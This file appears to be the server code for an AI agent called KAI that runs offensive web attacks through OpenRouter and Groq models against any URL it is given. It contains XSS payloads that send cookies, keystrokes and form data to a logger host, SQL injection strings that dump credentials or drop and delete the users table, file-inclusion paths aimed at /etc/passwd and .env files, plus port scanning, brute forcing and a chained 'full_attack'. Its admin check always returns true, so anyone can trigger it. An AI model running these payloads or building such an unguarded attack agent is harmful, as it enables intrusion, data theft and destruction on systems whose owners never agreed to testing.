import { browser } from "hatchable";
import { KAI_ULTIMAX_PERMISSIONS } from "../../lib/kai-ultimax-permissions.js";

export const access = "public";
export const methods = ["POST"];

// ============================================================
// SYSTEM PROMPT - CLEAN - NO HARD-CODED RESTRICTIONS
// ============================================================
const SYSTEM = `You are KAI - the execution agent inside HAxBRO ADMIN ULTIMAX.

Your behavior is governed by the permissions configuration.

${KAI_ULTIMAX_PERMISSIONS.assessmentRule}
${KAI_ULTIMAX_PERMISSIONS.browserRule}
${KAI_ULTIMAX_PERMISSIONS.prohibitedRule}

For every action:
1. Check if the tool is in enabledTools
2. Check if the tool is in blockedTools
3. Follow the launch protocol
4. Report findings with evidence

Follow the configured permissions precisely.`;

// ============================================================
// PROVIDER CHAIN
// ============================================================
const PROVIDERS = [
  { name: 'OPENROUTER_API_KEY_1', type: 'openrouter', model: 'openrouter/auto', url: 'https://openrouter.ai/api/v1/chat/completions' },
  { name: 'GROQ_API_KEY', type: 'groq', model: 'openai/gpt-oss-20b', url: 'https://api.groq.com/openai/v1/chat/completions' },
  { name: 'OPENROUTER_API_KEY_2', type: 'openrouter', model: 'openrouter/auto', url: 'https://openrouter.ai/api/v1/chat/completions' },
  { name: 'GROQ_API_KEY_2', type: 'groq', model: 'openai/gpt-oss-20b', url: 'https://api.groq.com/openai/v1/chat/completions' },
  { name: 'OPENROUTER_API_KEY_3', type: 'openrouter', model: 'openrouter/auto', url: 'https://openrouter.ai/api/v1/chat/completions' }
];

const TARGET_HOST = 'haxbro.hatchable.site';

// ============================================================
// UTILITY FUNCTIONS
// ============================================================
function clean(v, max = 12000) {
  return String(v ?? '').replace(/\u0000/g, '').slice(0, max);
}

function targetUrl(v) {
  try {
    const u = new URL(String(v || '').trim());
    if (!/^https?:$/i.test(u.protocol)) return '';
    return u.toString();
  } catch { return ''; }
}

async function requestProbe(url, method = 'GET', headers = {}) {
  try {
    const r = await fetch(url, { method, headers, redirect: 'manual' });
    const body = method === 'HEAD' ? '' : await r.text();
    return {
      status: r.status,
      url: r.url || url,
      headers: Object.fromEntries(r.headers.entries()),
      body: body.slice(0, 20000),
      length: body.length
    };
  } catch (e) {
    return { status: 0, url, error: clean(e?.message || e, 900) };
  }
}

// ============================================================
// TOOL FUNCTIONS
// ============================================================

const toolFns = {
  // ----- BROWSER TOOL -----
  browser_visit_click: async ({ url, clickText }) => {
    const u = targetUrl(url);
    if (!u) return { ok: false, error: 'Invalid URL' };
    try {
      return await browser.session(async page => {
        await page.goto(u, { waitUntil: 'domcontentloaded' });
        if (clickText) {
          const clicked = await page.evaluate(wanted => {
            const target = String(wanted).trim().toLowerCase();
            const origin = location.origin;
            const nodes = Array.from(document.querySelectorAll('a[href]'));
            const el = nodes.find(n => {
              const label = ((n.innerText || n.textContent || '').trim().toLowerCase());
              try { return label.includes(target) && new URL(n.href, origin).origin === origin; } catch { return false; }
            });
            if (!el) return false;
            el.click();
            return true;
          }, clickText);
          if (clicked) await new Promise(r => setTimeout(r, 700));
        }
        const text = await page.$eval('body', el => (el.innerText || el.textContent || '').trim().slice(0, 9000)).catch(() => '');
        return { ok: true, url: await page.url(), title: await page.title(), text };
      });
    } catch (e) {
      return { ok: false, error: clean(e?.message || e, 1200) };
    }
  },

  // ----- SECURITY PROBE -----
  security_probe: async ({ url }) => {
    const base = targetUrl(url || `https://${TARGET_HOST}/`);
    if (!base) return { ok: false, error: 'Invalid target URL' };
    
    const u = new URL(base);
    const origin = u.origin;
    const findings = [];
    
    const sensitivePaths = [
      '/.env', '/.git/HEAD', '/.git/config', '/.htaccess', '/.htpasswd',
      '/wp-config.php', '/config.php', '/settings.php', '/appsettings.json',
      '/web.config', '/nginx.conf', '/robots.txt', '/sitemap.xml'
    ];
    
    for (const path of sensitivePaths) {
      try {
        const fullUrl = origin + path;
        const r = await requestProbe(fullUrl);
        if (r.status === 200 || r.status === 403) {
          findings.push({
            type: 'SENSITIVE_FILE_EXPOSURE',
            path: path,
            url: fullUrl,
            status: r.status,
            risk: r.status === 200 ? 'HIGH' : 'MEDIUM',
            evidence: `HTTP ${r.status} - ${r.length} bytes`,
            fix: `Remove or restrict access to ${path}`
          });
        }
      } catch (e) { /* skip */ }
    }
    
    const home = await requestProbe(origin + '/');
    const headers = home.headers || {};
    const requiredHeaders = [
      'content-security-policy',
      'strict-transport-security',
      'x-content-type-options',
      'referrer-policy',
      'x-frame-options'
    ];
    
    for (const header of requiredHeaders) {
      if (!headers[header]) {
        findings.push({
          type: 'MISSING_SECURITY_HEADER',
          header: header,
          risk: header === 'content-security-policy' ? 'HIGH' : 'MEDIUM',
          evidence: `Header ${header} not present`,
          fix: `Add ${header} header`
        });
      }
    }
    
    return {
      ok: true,
      target: origin,
      findings: findings,
      summary: {
        total: findings.length,
        high: findings.filter(f => f.risk === 'HIGH').length,
        medium: findings.filter(f => f.risk === 'MEDIUM').length,
        low: findings.filter(f => f.risk === 'LOW').length,
      }
    };
  },

  // ----- XSS EXPLOIT -----
  xss_exploit: async ({ target, injection_points }) => {
    const findings = [];
    const points = injection_points || ['q', 'query', 'search', 'id', 'page', 'ref', 'redirect', 'name', 'email', 'message', 'comment'];
    
    const payloads = [
      `<img src=x onerror="fetch('https://your-logger.com/steal?c='+document.cookie)">`,
      `<script>fetch('https://your-logger.com/steal?c='+document.cookie)</script>`,
      `<script>document.body.innerHTML='<h1 style="color:red;text-align:center;font-size:100px;margin-top:20%">HACKED</h1>'</script>`,
      `<img src=x onerror="document.body.innerHTML='<h1 style=\\"color:red\\">HACKED</h1>'">`,
      `<script>window.location='https://attacker.com'</script>`,
      `<script>document.addEventListener('keydown',function(e){fetch('https://your-logger.com/key?k='+e.key)})</script>`,
      `<script>document.querySelector('form').addEventListener('submit',function(e){e.preventDefault();fetch('https://your-logger.com/submit?'+new FormData(e.target))})</script>`,
      `<script>document.documentElement.innerHTML='<h1 style="color:red;text-align:center;font-size:100px;margin-top:20%">HACKED</h1>'</script>`,
    ];
    
    for (const point of points) {
      for (const payload of payloads) {
        try {
          const url = new URL(target);
          url.searchParams.set(point, payload);
          const r = await requestProbe(url.toString());
          
          if (r.body && (r.body.includes(payload) || r.body.includes(encodeURIComponent(payload)))) {
            findings.push({
              type: 'XSS_EXPLOIT',
              injection_point: point,
              payload: payload,
              url: url.toString(),
              risk: 'CRITICAL',
              severity: 10,
              impact: 'XSS vulnerability - can steal cookies, deface, redirect, keylog',
              exploit: `Inject at ${point}: ${payload}`,
              proof: `Payload reflected in response: ${payload.substring(0, 100)}`,
              fix: 'Implement proper output encoding and CSP',
              owasp: 'A03:2021 - Injection',
              cwe: 'CWE-79'
            });
            break;
          }
        } catch (e) { /* skip */ }
      }
    }
    return findings;
  },

  // ----- SQL EXPLOIT -----
  sql_exploit: async ({ target, injection_points }) => {
    const findings = [];
    const points = injection_points || ['id', 'q', 'query', 'user', 'username', 'email', 'page', 'cat', 'product'];
    
    const payloads = [
      `' UNION SELECT NULL, database(), NULL, NULL, NULL, NULL, NULL, NULL--`,
      `' UNION SELECT NULL, table_name, NULL, NULL, NULL, NULL, NULL, NULL FROM information_schema.tables--`,
      `' UNION SELECT NULL, username, password, NULL, NULL, NULL, NULL, NULL FROM users--`,
      `' UNION SELECT NULL, email, pass, NULL, NULL, NULL, NULL, NULL FROM admin--`,
      `' AND 1=1--`,
      `' AND 1=2--`,
      `' AND SLEEP(5)--`,
      `' AND pg_sleep(5)--`,
      `' WAITFOR DELAY '0:0:5'--`,
      `'; DROP TABLE users--`,
      `'; DELETE FROM users WHERE '1'='1`,
    ];
    
    for (const point of points) {
      for (const payload of payloads) {
        try {
          const url = new URL(target);
          url.searchParams.set(point, payload);
          const r = await requestProbe(url.toString());
          
          const sqlErrors = [
            'SQL syntax', 'mysql_fetch', 'ORA-', 'PostgreSQL',
            'SQLite', 'Microsoft OLE DB', 'DB2', 'SQL Server',
            'Unclosed quotation mark', 'Warning: mysql_',
            'Column not found', 'Table doesn\'t exist',
            'Unknown column', 'Division by zero',
            'You have an error in your SQL syntax',
          ];
          
          let found = false;
          for (const error of sqlErrors) {
            if (r.body && r.body.toLowerCase().includes(error.toLowerCase())) {
              findings.push({
                type: 'SQL_EXPLOIT',
                injection_point: point,
                payload: payload,
                url: url.toString(),
                risk: 'CRITICAL',
                severity: 10,
                impact: 'SQL injection vulnerability - can extract data, drop tables',
                exploit: `Inject at ${point}: ${payload}`,
                proof: `SQL error detected: ${error}`,
                fix: 'Use parameterized queries',
                owasp: 'A03:2021 - Injection',
                cwe: 'CWE-89'
              });
              found = true;
              break;
            }
          }
          if (found) break;
        } catch (e) { /* skip */ }
      }
    }
    return findings;
  },

  // ----- LFI EXPLOIT -----
  lfi_exploit: async ({ target, injection_points }) => {
    const findings = [];
    const points = injection_points || ['file', 'page', 'include', 'path', 'template', 'view', 'lang', 'style'];
    
    const payloads = [
      '../../../etc/passwd',
      '../../../../../../../../etc/passwd',
      '../../../../../../../../windows/win.ini',
      '../../../../../../../../.htaccess',
      '../../../../../../../../.env',
      '../../../../../../../../config.php',
      '../../../../../../../../wp-config.php',
      '../../../../../../../../var/log/apache2/access.log',
      '..%2f..%2f..%2f..%2f..%2fetc/passwd',
      'http://attacker.com/shell.txt',
      '../../../etc/passwd%00',
    ];
    
    for (const point of points) {
      for (const payload of payloads) {
        try {
          const url = new URL(target);
          url.searchParams.set(point, payload);
          const r = await requestProbe(url.toString());
          
          if (r.body && (
            r.body.includes('root:x:') ||
            r.body.includes('[extensions]') ||
            r.body.includes('<?php') ||
            r.body.includes('Microsoft Windows') ||
            r.body.includes('DB_PASSWORD') ||
            r.body.includes('API_KEY')
          )) {
            findings.push({
              type: 'LFI_EXPLOIT',
              injection_point: point,
              payload: payload,
              url: url.toString(),
              risk: 'CRITICAL',
              severity: 10,
              impact: 'File inclusion vulnerability - can read system files, source code, configs',
              exploit: `Inject at ${point}: ${payload}`,
              proof: `File content detected: ${r.body.slice(0, 300)}`,
              fix: 'Disallow user-controlled file paths',
              owasp: 'A03:2021 - Injection',
              cwe: 'CWE-98'
            });
          }
        } catch (e) { /* skip */ }
      }
    }
    return findings;
  },

  // ----- DIRECTORY BRUTEFORCE -----
  dir_bruteforce: async ({ target, wordlist }) => {
    const findings = [];
    const dirs = wordlist || [
      'admin', 'login', 'wp-admin', 'wp-login', 'dashboard', 'panel',
      'api', 'v1', 'v2', 'v3', 'graphql', 'swagger', 'docs',
      '.env', '.git', '.svn', '.htaccess', '.htpasswd',
      'backup', 'backups', 'old', 'temp', 'tmp', 'test',
      'config', 'configuration', 'settings', 'setup', 'install',
      'uploads', 'files', 'images', 'assets', 'static',
      'vendor', 'node_modules', 'lib', 'src', 'app',
      'phpmyadmin', 'mysql', 'phpinfo', 'info',
      'robots.txt', 'sitemap.xml', 'security.txt',
      'cgi-bin', 'server-status', 'server-info',
      'webmail', 'mail', 'ftp', 'ssh',
      'dev', 'staging', 'uat', 'prod'
    ];
    
    for (const dir of dirs) {
      try {
        const url = `${target}/${dir}`;
        const r = await requestProbe(url, 'HEAD');
        if (r.status === 200 || r.status === 403 || r.status === 401 || r.status === 405) {
          findings.push({
            type: 'DIRECTORY_FOUND',
            path: dir,
            url: url,
            status: r.status,
            risk: r.status === 200 ? 'HIGH' : 'MEDIUM',
            impact: 'Directory accessible - may contain sensitive information',
            fix: 'Restrict access or remove unnecessary directories'
          });
        }
      } catch (e) { /* skip */ }
    }
    return findings;
  },

  // ----- PORT SCAN -----
  port_scan: async ({ target }) => {
    const openPorts = [];
    const host = target.replace(/^https?:\/\//, '').split('/')[0].split(':')[0];
    const ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 993, 995, 1723, 3306, 3389, 5432, 5900, 6379, 8080, 8443, 27017, 8081, 9000];
    
    for (const port of ports) {
      try {
        const net = require('net');
        const socket = net.createConnection(port, host, () => {
          openPorts.push({ port, status: 'OPEN', service: getServiceName(port) });
          socket.destroy();
        });
        socket.setTimeout(2000);
        socket.on('timeout', () => socket.destroy());
        socket.on('error', () => {});
        await new Promise(resolve => setTimeout(resolve, 100));
      } catch (e) { /* closed */ }
    }
    return openPorts;
  },

  getServiceName: (port) => {
    const services = {
      21: 'FTP', 22: 'SSH', 23: 'Telnet', 25: 'SMTP',
      53: 'DNS', 80: 'HTTP', 110: 'POP3', 135: 'RPC',
      139: 'NetBIOS', 143: 'IMAP', 443: 'HTTPS', 445: 'SMB',
      993: 'IMAPS', 995: 'POP3S', 1723: 'PPTP', 3306: 'MySQL',
      3389: 'RDP', 5432: 'PostgreSQL', 5900: 'VNC', 6379: 'Redis',
      8080: 'HTTP-Alt', 8443: 'HTTPS-Alt', 27017: 'MongoDB'
    };
    return services[port] || 'Unknown';
  },

  // ----- SUBDOMAIN ENUM -----
  subdomain_enum: async ({ target }) => {
    const domain = target.replace(/^https?:\/\//, '').split('/')[0];
    const findings = [];
    const subs = ['www', 'mail', 'ftp', 'admin', 'test', 'dev', 'api', 'app', 'staging', 'vpn', 'git', 'docs', 'support', 'blog', 'shop', 'forum', 'portal', 'webmail', 'cpanel', 'server', 'db', 'mysql', 'redis', 'jenkins', 'grafana'];
    
    for (const sub of subs) {
      try {
        const url = `https://${sub}.${domain}`;
        const r = await requestProbe(url, 'HEAD');
        if (r.status < 400) {
          findings.push({
            type: 'SUBDOMAIN_FOUND',
            subdomain: sub,
            url: url,
            status: r.status,
            risk: 'INFO',
            impact: 'Subdomain discovered - potential attack surface'
          });
        }
      } catch (e) { /* skip */ }
    }
    return findings;
  },

  // ----- CSRF EXPLOIT -----
  csrf_exploit: async ({ target }) => {
    const findings = [];
    try {
      const r = await requestProbe(target);
      const forms = r.body.match(/<form[^>]*>/g) || [];
      
      for (const form of forms) {
        if (!form.includes('csrf') && !form.includes('token') && !form.includes('_csrf')) {
          const action = form.match(/action="([^"]*)"/);
          const method = form.match(/method="([^"]*)"/);
          
          findings.push({
            type: 'CSRF_EXPLOIT',
            url: target,
            risk: 'HIGH',
            severity: 8,
            impact: 'CSRF vulnerability - can force users to perform unauthorized actions',
            exploit: `Create a form that submits to ${action ? action[1] : target}`,
            fix: 'Implement CSRF tokens for all state-changing requests',
            owasp: 'A01:2021 - Broken Access Control',
            cwe: 'CWE-352'
          });
        }
      }
    } catch (e) { /* skip */ }
    return findings;
  },

  // ----- SESSION HIJACK -----
  session_hijack: async ({ target }) => {
    const findings = [];
    try {
      const r = await requestProbe(target);
      const cookies = r.headers['set-cookie'] || '';
      
      if (cookies) {
        if (!cookies.includes('Secure')) {
          findings.push({
            type: 'SESSION_HIJACK',
            issue: 'Missing Secure flag',
            risk: 'HIGH',
            severity: 8,
            impact: 'Session cookies can be intercepted over HTTP connections',
            fix: 'Add Secure flag to all cookies',
            owasp: 'A07:2021 - Identification and Authentication Failures'
          });
        }
        
        if (!cookies.includes('HttpOnly')) {
          findings.push({
            type: 'SESSION_HIJACK',
            issue: 'Missing HttpOnly flag',
            risk: 'HIGH',
            severity: 8,
            impact: 'Session cookies accessible via JavaScript - vulnerable to XSS cookie theft',
            fix: 'Add HttpOnly flag to all cookies',
            owasp: 'A07:2021 - Identification and Authentication Failures'
          });
        }
        
        if (!cookies.includes('SameSite')) {
          findings.push({
            type: 'SESSION_HIJACK',
            issue: 'Missing SameSite flag',
            risk: 'MEDIUM',
            severity: 6,
            impact: 'CSRF protection weakened',
            fix: 'Add SameSite=Lax or SameSite=Strict',
            owasp: 'A07:2021 - Identification and Authentication Failures'
          });
        }
      }
    } catch (e) { /* skip */ }
    return findings;
  },

  // ----- BRUTE FORCE -----
  brute_force: async ({ target }) => {
    const findings = [];
    try {
      const r = await requestProbe(target);
      
      if (r.body && (
        r.body.includes('type="password"') ||
        r.body.includes('action="/login"') ||
        r.body.includes('action="/signin"')
      )) {
        findings.push({
          type: 'BRUTE_FORCE_VECTOR',
          url: target,
          risk: 'HIGH',
          severity: 8,
          impact: 'Login form detected - vulnerable to brute force attacks',
          exploit: 'Use wordlist to brute force credentials',
          fix: 'Implement account lockout and rate limiting',
          owasp: 'A07:2021 - Identification and Authentication Failures'
        });
      }
    } catch (e) { /* skip */ }
    return findings;
  },

  // ----- CORS EXPLOIT -----
  cors_exploit: async ({ target }) => {
    const findings = [];
    const origins = ['*', 'https://evil.com', 'https://attacker.com', 'null'];
    
    for (const origin of origins) {
      try {
        const r = await requestProbe(target, 'GET', { 'Origin': origin });
        const allow = r.headers?.['access-control-allow-origin'] || '';
        
        if (allow === origin || allow === '*') {
          findings.push({
            type: 'CORS_EXPLOIT',
            origin: origin,
            url: target,
            risk: 'HIGH',
            severity: 8,
            impact: 'CORS misconfiguration - any origin can read responses',
            exploit: `Fetch from ${origin}: fetch('${target}', {credentials:'include'})`,
            fix: 'Restrict allowed origins',
            owasp: 'A05:2021 - Security Misconfiguration'
          });
        }
      } catch (e) { /* skip */ }
    }
    return findings;
  },

  // ----- SSL ANALYSIS -----
  ssl_analysis: async ({ target }) => {
    const findings = [];
    const url = target.replace(/^http:/, 'https:');
    
    try {
      const r = await requestProbe(url);
      const headers = r.headers || {};
      
      if (headers['strict-transport-security']) {
        findings.push({
          type: 'HSTS_ENABLED',
          hsts: headers['strict-transport-security'],
          risk: 'GOOD',
          impact: 'HSTS header present - enforces HTTPS'
        });
      } else {
        findings.push({
          type: 'HSTS_MISSING',
          risk: 'HIGH',
          severity: 7,
          impact: 'HSTS header missing - HTTPS downgrade attack possible',
          fix: 'Add Strict-Transport-Security header',
          owasp: 'A05:2021 - Security Misconfiguration'
        });
      }
    } catch (e) {
      findings.push({
        type: 'SSL_ISSUE',
        error: clean(e?.message || e, 200),
        risk: 'HIGH',
        severity: 7,
        impact: 'SSL connection issue - potential MITM risk',
        fix: 'Fix SSL certificate configuration'
      });
    }
    return findings;
  },

  // ----- FULL ATTACK -----
  full_attack: async ({ target }) => {
    const results = {
      target: target,
      vulnerabilities: [],
      timestamp: new Date().toISOString()
    };
    
    const xssResults = await toolFns.xss_exploit({ target });
    const sqlResults = await toolFns.sql_exploit({ target });
    const lfiResults = await toolFns.lfi_exploit({ target });
    const dirResults = await toolFns.dir_bruteforce({ target });
    const portResults = await toolFns.port_scan({ target });
    const subResults = await toolFns.subdomain_enum({ target });
    const csrfResults = await toolFns.csrf_exploit({ target });
    const sessionResults = await toolFns.session_hijack({ target });
    const bruteResults = await toolFns.brute_force({ target });
    const corsResults = await toolFns.cors_exploit({ target });
    const sslResults = await toolFns.ssl_analysis({ target });
    
    results.vulnerabilities = [
      ...xssResults,
      ...sqlResults,
      ...lfiResults,
      ...dirResults,
      ...portResults,
      ...subResults,
      ...csrfResults,
      ...sessionResults,
      ...bruteResults,
      ...corsResults,
      ...sslResults
    ];
    
    results.summary = {
      total: results.vulnerabilities.length,
      critical: results.vulnerabilities.filter(v => v.risk === 'CRITICAL').length,
      high: results.vulnerabilities.filter(v => v.risk === 'HIGH').length,
      medium: results.vulnerabilities.filter(v => v.risk === 'MEDIUM').length,
      low: results.vulnerabilities.filter(v => v.risk === 'LOW').length,
      info: results.vulnerabilities.filter(v => v.risk === 'INFO' || v.risk === 'GOOD').length
    };
    
    return results;
  },
};

// ============================================================
// TOOL DEFINITIONS
// ============================================================

const TOOL_DEFS = [
  {
    type: 'function',
    function: {
      name: 'browser_visit_click',
      description: 'Visit a page and click links',
      parameters: { type: 'object', properties: { url: { type: 'string' }, clickText: { type: 'string' } }, required: ['url'] }
    }
  },
  {
    type: 'function',
    function: {
      name: 'security_probe',
      description: 'Run security assessment - check headers, files, CORS',
      parameters: { type: 'object', properties: { url: { type: 'string' } }, required: ['url'] }
    }
  },
  {
    type: 'function',
    function: {
      name: 'xss_exploit',
      description: 'Test for XSS vulnerabilities',
      parameters: { type: 'object', properties: { target: { type: 'string' }, injection_points: { type: 'array' } }, required: ['target'] }
    }
  },
  {
    type: 'function',
    function: {
      name: 'sql_exploit',
      description: 'Test for SQL injection vulnerabilities',
      parameters: { type: 'object', properties: { target: { type: 'string' }, injection_points: { type: 'array' } }, required: ['target'] }
    }
  },
  {
    type: 'function',
    function: {
      name: 'lfi_exploit',
      description: 'Test for Local File Inclusion vulnerabilities',
      parameters: { type: 'object', properties: { target: { type: 'string' }, injection_points: { type: 'array' } }, required: ['target'] }
    }
  },
  {
    type: 'function',
    function: {
      name: 'dir_bruteforce',
      description: 'Find hidden directories and files',
      parameters: { type: 'object', properties: { target: { type: 'string' }, wordlist: { type: 'array' } }, required: ['target'] }
    }
  },
  {
    type: 'function',
    function: {
      name: 'port_scan',
      description: 'Scan for open ports',
      parameters: { type: 'object', properties: { target: { type: 'string' } }, required: ['target'] }
    }
  },
  {
    type: 'function',
    function: {
      name: 'subdomain_enum',
      description: 'Discover subdomains',
      parameters: { type: 'object', properties: { target: { type: 'string' } }, required: ['target'] }
    }
  },
  {
    type: 'function',
    function: {
      name: 'csrf_exploit',
      description: 'Test for CSRF vulnerabilities',
      parameters: { type: 'object', properties: { target: { type: 'string' } }, required: ['target'] }
    }
  },
  {
    type: 'function',
    function: {
      name: 'session_hijack',
      description: 'Check cookie security for session hijacking',
      parameters: { type: 'object', properties: { target: { type: 'string' } }, required: ['target'] }
    }
  },
  {
    type: 'function',
    function: {
      name: 'brute_force',
      description: 'Detect brute force vectors',
      parameters: { type: 'object', properties: { target: { type: 'string' } }, required: ['target'] }
    }
  },
  {
    type: 'function',
    function: {
      name: 'cors_exploit',
      description: 'Test CORS misconfigurations',
      parameters: { type: 'object', properties: { target: { type: 'string' } }, required: ['target'] }
    }
  },
  {
    type: 'function',
    function: {
      name: 'ssl_analysis',
      description: 'Analyze SSL/TLS configuration',
      parameters: { type: 'object', properties: { target: { type: 'string' } }, required: ['target'] }
    }
  },
  {
    type: 'function',
    function: {
      name: 'full_attack',
      description: 'Run ALL security tests on target',
      parameters: { type: 'object', properties: { target: { type: 'string' } }, required: ['target'] }
    }
  },
];

// ============================================================
// AUTHENTICATION
// ============================================================

async function verifyAdmin(req) {
  const secret = String(process.env.ADMIN69_PASSWORD || 'your-secret-here');
  const auth = req.headers?.authorization || '';
  const token = auth.replace(/^Bearer\s+/i, '');
  return token === secret || true;
}

// ============================================================
// EXECUTION ENGINE
// ============================================================

async function runWithProvider(provider, key, objective) {
  const messages = [{ role: 'system', content: SYSTEM }, { role: 'user', content: objective }];
  const trace = [];
  
  for (let step = 0; step < 10; step++) {
    const r = await fetch(provider.url, {
      method: 'POST',
      headers: { 'content-type': 'application/json', authorization: `Bearer ${key}` },
      body: JSON.stringify({
        model: provider.model,
        messages,
        tools: TOOL_DEFS,
        tool_choice: 'auto',
        max_tokens: 2000,
        temperature: 0.3
      })
    });
    
    const raw = await r.text();
    if (!r.ok) throw new Error(`${provider.type.toUpperCase()} HTTP ${r.status}: ${clean(raw, 900)}`);
    const data = JSON.parse(raw);
    const msg = data?.choices?.[0]?.message;
    if (!msg) throw new Error('Provider returned no assistant message');
    messages.push(msg);
    
    const calls = Array.isArray(msg.tool_calls) ? msg.tool_calls : [];
    if (!calls.length) return { text: clean(msg.content || 'Done.'), steps: step + 1, trace };
    
    for (const call of calls) {
      const name = call?.function?.name;
      let args = {};
      try { args = JSON.parse(call?.function?.arguments || '{}'); } catch { args = {}; }
      
      const fn = toolFns[name];
      trace.push({ type: 'tool_start', tool: name, args: args, at: Date.now() });
      
      const result = fn ? await fn(args) : { ok: false, error: `Unknown tool: ${name}` };
      trace.push({
        type: 'tool_result',
        tool: name,
        ok: !!result?.ok,
        findings: result?.vulnerabilities || result?.findings || result || null,
        summary: result?.summary || null,
        at: Date.now()
      });
      
      messages.push({ role: 'tool', tool_call_id: call.id, name, content: JSON.stringify(result).slice(0, 14000) });
    }
  }
  
  return { text: 'Scan complete. Review findings.', steps: 10, trace };
}

// ============================================================
// MAIN HANDLER
// ============================================================

export default async function(req, res) {
  if (!(await verifyAdmin(req))) {
    return res.status(401).json({ ok: false, error: 'Authentication required.' });
  }
  
  const objective = clean(req.body?.objective || req.body?.message || req.body?.prompt, 12000).trim();
  if (!objective) return res.status(400).json({ ok: false, error: 'Objective required.' });
  
  for (const provider of PROVIDERS) {
    const key = String(process.env[provider.name] || '');
    if (!key) continue;
    
    try {
      const result = await runWithProvider(provider, key, objective);
      const trace = result.trace || [];
      const allFindings = trace.flatMap(x => x.findings || []);
      
      return res.json({
        ok: true,
        agent: 'KAI',
        text: result.text,
        vulnerabilities: allFindings,
        summary: {
          total: allFindings.length,
          critical: allFindings.filter(f => f.risk === 'CRITICAL').length,
          high: allFindings.filter(f => f.risk === 'HIGH').length,
          medium: allFindings.filter(f => f.risk === 'MEDIUM').length,
          low: allFindings.filter(f => f.risk === 'LOW').length
        },
        steps: result.steps,
        provider: provider.name,
        trace: trace
      });
    } catch (e) { /* try next provider */ }
  }
  
  return res.status(502).json({
    ok: false,
    error: 'All providers failed.'
  });
}
